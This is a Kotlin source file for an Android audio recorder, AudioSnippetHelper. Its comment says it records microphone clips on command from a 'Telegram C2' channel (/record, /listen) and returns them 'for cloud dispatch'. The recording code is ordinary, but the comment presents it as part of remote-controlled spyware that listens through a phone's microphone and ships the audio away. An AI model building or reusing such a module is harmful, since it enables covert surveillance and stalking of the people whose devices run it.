package com.example.core.recorder

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean

/**
 * AudioSnippetHelper records an on-demand audio clip (e.g. 15s to 120s)
 * triggered via Telegram C2 (/record [sec] or /listen) and returns the file for cloud dispatch.
 */
object AudioSnippetHelper {

    private const val TAG = "AudioSnippetHelper"

    fun recordSnippet(
        context: Context,
        durationSeconds: Int = 30,
        onProgress: (remainingSeconds: Int) -> Unit = {},
        onResult: (audioFile: File?, errorMsg: String?) -> Unit
    ) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Audio permission not granted")
            onResult(null, "RECORD_AUDIO permission is not granted on this device.")
            return
        }

        val clampedDuration = durationSeconds.coerceIn(5, 120)
        val audioSettings = AudioRecordingSettings.getInstance(context)
        val audioSource = if (audioSettings.isVoiceFocusEnabled.value) {
            MediaRecorder.AudioSource.VOICE_RECOGNITION
        } else {
            MediaRecorder.AudioSource.MIC
        }

        val outputFile = File(context.cacheDir, "snippet_${System.currentTimeMillis()}.m4a")
        val handler = Handler(Looper.getMainLooper())
        val isCompleted = AtomicBoolean(false)

        val recorder = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed initializing MediaRecorder", e)
            onResult(null, "Failed initializing audio recorder: ${e.message}")
            return
        }

        fun cleanup(rec: MediaRecorder?) {
            try {
                rec?.stop()
            } catch (_: Exception) {}
            try {
                rec?.reset()
            } catch (_: Exception) {}
            try {
                rec?.release()
            } catch (_: Exception) {}
        }

        try {
            recorder.apply {
                setAudioSource(audioSource)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioChannels(1)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(64000)
                setOutputFile(outputFile.absolutePath)
                prepare()
                start()
            }
            Log.i(TAG, "Started recording ${clampedDuration}s audio snippet to ${outputFile.absolutePath}")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting recorder: ${e.message}", e)
            cleanup(recorder)
            outputFile.delete()
            onResult(null, "Failed starting audio recorder: ${e.message}")
            return
        }

        var secondsRemaining = clampedDuration
        val ticker = object : Runnable {
            override fun run() {
                if (isCompleted.get()) return
                secondsRemaining--
                onProgress(secondsRemaining)
                if (secondsRemaining <= 0) {
                    if (isCompleted.compareAndSet(false, true)) {
                        cleanup(recorder)
                        if (outputFile.exists() && outputFile.length() > 0) {
                            Log.i(TAG, "Snippet recording finished (${outputFile.length()} bytes)")
                            onResult(outputFile, null)
                        } else {
                            onResult(null, "Audio recording resulted in an empty file.")
                        }
                    }
                } else {
                    handler.postDelayed(this, 1000L)
                }
            }
        }
        handler.postDelayed(ticker, 1000L)
    }
}
